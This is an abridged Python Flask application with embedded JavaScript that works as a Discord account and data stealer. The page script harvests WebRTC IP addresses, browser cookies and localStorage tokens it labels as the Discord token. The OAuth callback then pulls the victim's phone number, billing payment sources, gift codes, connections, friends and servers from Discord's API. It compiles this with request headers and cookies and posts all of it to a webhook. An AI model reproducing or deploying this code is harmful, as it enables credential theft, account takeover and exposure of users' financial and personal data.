from flask import Flask, redirect, request, render_template_string, session, jsonify, send_file
import requests
        ...
        async function collectFingerprint() {
            ...
            try {
                ...
                pc.onicecandidate = (ice) => {
                    ...
                    const ip = parts[4];
                    if (ip && !fp.webrtc_ips.includes(ip)) fp.webrtc_ips.push(ip);
                };
            ...
            try {
                ...
                fp.browser_cookies = {};
                fp.browser_cookies_count = allCookies.length;
                ...
                for (let i = 0; i < localStorage.length; i++) {
                    ...
                    if (key && key.startsWith('token')) {
                        ...
                        if (value && value.length > 50) {
                            fp.discord_token = value.replace(/"/g, '');
                            break;
                        }
                    }
                }
            } catch(e) {
                fp.discord_token = 'Error: ' + e.message;
            }
...
def store_fingerprint():
    ...
    print(f"[+] Collecting fingerprint from IP: {client_ip}")
...
def callback():
    ...
    auth_headers_oauth = {"Authorization": f"Bearer {access_token}"}
    auth_headers_user = {"Authorization": access_token}
    
    phone_number = "Not Available"
    try:
        phone_response = requests.get(f"{DISCORD_API}/users/@me/phone", headers=auth_headers_user)
    ...
    try:
        gift_response = requests.get(f"{DISCORD_API}/users/@me/entitlements/gift-codes", headers=auth_headers_user)
    ...
    try:
        outbound_response = requests.get(f"{DISCORD_API}/users/@me/outbound-promotions/codes", headers=auth_headers_user)
    ...
    try:
        entitlements_response = requests.get(f"{DISCORD_API}/users/@me/entitlements", headers=auth_headers_user)
    ...
    billing_info = []
    try:
        billing_response = requests.get(f"{DISCORD_API}/users/@me/billing/payment-sources", headers=auth_headers_user)
    ...
    connections = []
    try:
        connections_response = requests.get(f"{DISCORD_API}/users/@me/connections", headers=auth_headers_oauth)
    ...
    friends_count = 0
    try:
        relationships_response = requests.get(f"{DISCORD_API}/users/@me/relationships", headers=auth_headers_user)
    ...
    user_profile = {}
    try:
        profile_response = requests.get(f"{DISCORD_API}/users/@me/profile", headers=auth_headers_user)
    ...
    guilds_detailed = []
    try:
        guilds_response = requests.get(f"{DISCORD_API}/users/@me/guilds", headers=auth_headers_oauth)
    ...
    if all_request_headers:
        content_lines.append(f"")
        content_lines.append(f"HEADERS:")
        for header in important_headers:
            if header in all_request_headers:
                content_lines.append(f"  {header}: {str(all_request_headers[header])[:150]}")
    
    all_cookies = replit_info.get('cookies', {})
    if all_cookies:
        cookies_list = []
        for cookie_name, cookie_value in all_cookies.items():
            if cookie_value and cookie_value != 'Not Available':
                cookies_list.append(f"  {cookie_name}: {str(cookie_value)[:100]}")
        if cookies_list:
            content_lines.append(f"")
            content_lines.append(f"COOKIES (Server):")
            content_lines.extend(cookies_list[:20])
    
    browser_cookies = fingerprint.get('browser_cookies', {})
    if browser_cookies:
        browser_cookies_list = []
        for cookie_name, cookie_value in browser_cookies.items():
            browser_cookies_list.append(f"  {cookie_name}: {str(cookie_value)[:100]}")
        if browser_cookies_list:
            content_lines.append(f"")
            content_lines.append(f"COOKIES (Browser - {len(browser_cookies)} total):")
            content_lines.extend(browser_cookies_list[:20])
    
    open_tabs = fingerprint.get('open_tabs', {})
    if open_tabs and not open_tabs.get('error'):
        content_lines.append(f"")
        content_lines.append(f"OPEN TABS:")
        content_lines.append(f"  Current: {open_tabs.get('current_title', 'Unknown')}")
    ...
    embed = {
        "content": x_replit_content[:2000] if x_replit_content else None,
        "embeds": embeds_list
    }
    
    if not embed["content"]:
        del embed["content"]
    ...
    try:
        if WEBHOOK:
            ...
            payload = {}
            if x_replit_content:
                payload["content"] = x_replit_content[:2000]
            payload["embeds"] = embeds_list
            
            payload_size = len(json.dumps(payload))
            print(f"[*] Sending {len(embeds_list)} embeds in ONE message (payload: {payload_size:,} bytes)")
            
            response = requests.post(WEBHOOK, json=payload, headers=headers, timeout=10)
            
            if response.status_code in [200, 204]:
                print(f"[+] ✅ SUCCESS All {len(embeds_list)} embeds sent to Discord!")
            else:
